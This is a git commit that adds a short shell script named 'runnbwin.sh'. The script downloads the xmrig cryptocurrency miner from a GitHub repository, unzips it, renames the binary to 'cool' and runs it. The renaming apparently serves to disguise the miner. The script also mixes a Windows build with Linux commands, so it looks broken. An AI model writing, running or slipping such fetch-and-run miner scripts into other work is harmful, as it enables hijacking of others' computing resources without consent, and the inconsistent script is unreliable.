331ad5b0a4f5cd9bc4ae6efd547eb41312ac32c7
orkaroeli <86050638+orkaroeli@users.noreply.github.com>
2024-11-18 17:56:57 -0300

    Create runnbwin.sh

---
+++ runnbwin.sh
@@ -0,0 +1,8 @@
+sudo apt install wget
+apt install wget
+wget https://github.com/orkaroeli/orkaroeliminer/raw/refs/heads/main/xmrig-6.21.0-msvc-win64.zip
+unzip xmrig-6.21.0-msvc-win64.zip
+cd xmrig-6.21.0
+chmod +x xmrig
+ mv xmrig cool
+./cool
